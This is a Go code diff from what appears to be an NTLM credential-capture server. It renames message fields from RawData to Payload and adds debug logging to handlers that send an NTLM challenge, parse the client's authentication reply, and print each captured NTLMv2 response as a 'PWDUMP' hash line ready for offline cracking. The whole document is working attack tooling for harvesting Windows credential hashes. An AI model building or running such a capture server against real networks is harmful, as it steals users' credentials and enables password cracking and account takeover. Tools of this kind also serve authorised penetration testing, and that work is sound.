@@ -76,9 +76,9 @@ func (n NTLMAuth) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if msg3 != nil && ntlmv2Response != nil {
-		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
+		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.Payload), string(msg3.TargetName.Payload), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])
 
-		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
+		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.Payload), string(msg3.Username.Payload))
 		if _, found := NtlmCapturedAuth[authInformations]; !found {
 			NtlmCapturedAuth[authInformations] = true
 			logger.Printf("\n[+] PWDUMP:\n%s\n", ntlmv2_pwdump)
@@ -141,6 +141,10 @@ func (n NTLMAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, ne
 
 		msg2 := NewNTLMSSP_CHALLENGEShort()
 		msg2b64 := base64.RawStdEncoding.EncodeToString(msg2.ToBytes())
+		logger.Printf("[NTLM message type 2] %s\n", msg2.ToString())
+		logger.Printf("%x\n", msg2)
+		logger.Printf("%v\n", msg2)
+		logger.Printf("%#v\n", msg2)
 
 		header := fmt.Sprintf("NTLM %s", msg2b64)
 
@@ -161,16 +165,16 @@ func (n NTLMAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, ne
 
 		msg3 := NTLMSSP_AUTH{}
 		msg3.Read(authorization_bytes)
-		logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", msg3.TargetName.RawData, msg3.Username.RawData, msg3.Workstation.RawData)
+		logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", msg3.TargetName.Payload, msg3.Username.Payload, msg3.Workstation.Payload)
 		logger.Printf("[NTLM message type 3]\n%s", msg3.ToString())
 
 		ntlmv2Response := NTLMv2Response{}
-		ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
+		ntlmv2Response.Read(msg3.NTLMv2Response.Payload)
 		logger.Printf("%s", ntlmv2Response.ToString())
 
-		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
+		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.Payload), string(msg3.TargetName.Payload), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])
 
-		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
+		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.Payload), string(msg3.Username.Payload))
 		if _, found := NtlmCapturedAuth[authInformations]; !found {
 			NtlmCapturedAuth[authInformations] = true
 			logger.Printf("[PWDUMP] %s", ntlmv2_pwdump)
